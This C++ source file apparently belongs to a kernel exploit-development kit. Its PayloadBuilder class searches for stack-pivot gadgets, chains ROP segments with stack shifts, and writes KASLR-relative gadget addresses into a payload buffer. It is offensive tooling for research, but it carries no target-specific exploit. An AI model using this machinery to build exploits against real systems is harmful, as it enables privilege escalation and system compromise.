/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <sstream>
#include <iomanip>

#include "pivot/PivotFinder.cpp"

#include "PayloadBuilder.h"


std::string intToHex(uint64_t value) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::uppercase << value;
    return ss.str();
}

void PayloadBuilder::AddPayload(Payload& payload,
                                 const std::vector<Register>& registers,
                                 std::optional<size_t> next_rip_offset) {
    payload_datas_.emplace_back(payload, registers, next_rip_offset);
}

void PayloadBuilder::AddPayload(Payload& payload,
                                 std::optional<Register> reg,
                                 std::optional<size_t> next_rip_offset) {
    std::vector<Register> regs;
    if (reg) regs.push_back(reg.value());
    payload_datas_.emplace_back(payload, regs, next_rip_offset);
}

void PayloadBuilder::AddRopChain(const RopChain& rop_chain) {
    std::vector<RopAction> new_actions = rop_chain.GetActions();
    rop_actions_.insert(rop_actions_.end(), new_actions.begin(), new_actions.end());
}

bool PayloadBuilder::Build(bool need_pivot) {
    // TODO handle case with no pivot?

    // Create a vector of references to the payloads
    std::vector<std::reference_wrapper<PayloadData>> data_refs;
    for (auto& data : payload_datas_) {
        data_refs.push_back(std::ref(data));
    }

    std::optional<uint64_t*> rip_pointer;

    // Iterate through the payloads and reserve offset which is used for rip;
    if (need_pivot) {
        for (const auto &data_ref : data_refs) {
            PayloadData &data = data_ref.get();
            if (data.next_rip_offset)
            {
                if(rip_pointer) throw ExpKitError("multiple rip_offsets");
                rip_pointer = (uint64_t*)data.payload.Reserve(data.next_rip_offset.value(), 8);
            }
        }
    }

    // Compute estimated sizes
    std::vector<std::tuple<std::reference_wrapper<PayloadData>, StackPivot, uint64_t>> items;
    for (const auto &data_ref : data_refs) {
        PayloadData &data = data_ref.get();
        PivotFinder pivot_finder(pivots_, data.registers, data.payload);
        for (auto& pivot : pivot_finder.FindAll()) {
            auto snapshot = data.payload.Snapshot();
            pivot.ApplyToPayload(snapshot, kaslr_base_);

            uint64_t offset = pivot.GetDestinationOffset();
            uint64_t estimated_size = EstimatePayloadSpaceAfter(snapshot, offset);
            items.push_back(std::make_tuple(data_ref, pivot, estimated_size));
        }
    }

    // sort by decreasing estimated size
    std::sort(items.begin(), items.end(),
            [](const auto& a, const auto& b) { //Use auto
                return std::get<2>(a) > std::get<2>(b);
            });

    // now try until we find a good one?
    for(auto& item: items) {
        if(TryPayloadPivot(std::get<0>(item).get().payload, std::get<1>(item))) {
            **rip_pointer = kaslr_base_ + std::get<1>(item).GetGadgetOffset();
            return true;
        }
    }

    return false; // Or true, depending on default success behavior.
}

void PayloadBuilder::PrintDebugInfo() const {
    if (rop_actions_.size() != chosen_shifts_.size()) {
        printf("[-] Payload build failed\n");
        return;
    }

    printf("[+] Payload built with:\n");

    if (chosen_pivot_) {
        printf("[+]    Stack pivot: %s\n", chosen_pivot_->GetDescription().c_str());
    }
    uint64_t offset = chosen_pivot_->GetDestinationOffset()+8;

    for (int i = 0; i < chosen_shifts_.size(); i++) {
        const StackShiftingInfo &shift_info = chosen_shifts_[i];
        uint64_t to_offset = shift_info.to_offset;
        if(shift_info.stack_shifts.size() > 0) {
            uint64_t ret_offset = shift_info.next_ret_offset;
            printf("[+]    Shifts from: %#x to next ret: %#x and stack pos: %#x\n",
                   shift_info.from_offset, ret_offset, to_offset);
            for (auto& shift : shift_info.stack_shifts) {
                uint64_t sp_offset = offset + shift.pivot.shift_amount;
                uint64_t ret_offset = offset + shift.pivot.ret_offset;
                printf("[+]        Stack shift @%#x at offset: %#x next ret: %#x next sp: %#x\n",
                       shift.pivot.address, shift.ret_offset, ret_offset, sp_offset);
            }
        }

        uint64_t rop_chain_size = rop_actions_[i].values.size()*8;
        uint64_t num_actions = 1;
        // merge actions for printing while there's no shifts after the current index
        while (i+1 < chosen_shifts_.size() && chosen_shifts_[i+1].stack_shifts.size() == 0) {
            i++;
            num_actions++;
            rop_chain_size += rop_actions_[i].values.size()*8;
        }

        if (to_offset != shift_info.next_ret_offset + 8) {
            // this case is a retn
            printf("[+]    first rop gadget at: %#x (for retn)\n", shift_info.next_ret_offset);
            rop_chain_size -= 8;
        }
        printf("[+]    rop chain at offset: %#x of size: %#x\n", to_offset, rop_chain_size);
    }
}

bool PayloadBuilder::TryPayloadPivot(Payload& payload, StackPivot pivot) {
    auto snapshot = payload.Snapshot();
    pivot.ApplyToPayload(payload, kaslr_base_);

    PivotFinder pivot_finder(pivots_, {}, payload);

    uint64_t payload_off = pivot.GetDestinationOffset();

    chosen_shifts_.clear();

    // now we need to see if we can apply the all the rop actions, shifting to the next action as needed
    for (int i = 0; i < rop_actions_.size(); i++) {
        auto &action = rop_actions_[i];
        auto shifts = pivot_finder.GetShiftToRop(payload_off, 
                                                 action.values.size()*8, 
                                                 i != rop_actions_.size()-1 /* include_extra_slot */
                                                );

        if (!shifts ) {
            // failed restore payload
            payload.Restore(snapshot);
            return false;
        }

        chosen_shifts_.push_back(*shifts);

        shifts->Apply(kaslr_base_, payload);
        std::vector<uint64_t> &rop_words = action.values;
        payload.Set(shifts->next_ret_offset, rop_words[0]);

        payload_off = shifts->to_offset;
        for(uint64_t i = 1; i < rop_words.size(); i++) {
            payload.Set(payload_off, rop_words[i]);
            payload_off += 8;
        }
    }
    
    chosen_pivot_ = pivot;
    chosen_payload_ = payload;
    return true;
}

uint64_t PayloadBuilder::EstimatePayloadSpaceAfter(Payload& payload, uint64_t offset) {
    uint64_t available = 0;
    uint64_t size = payload.Size();
    for(; offset < size; offset+=8) {
        if (payload.CheckFree(offset, 8)) {
            available += 8;
        }
    }
    return available;
}



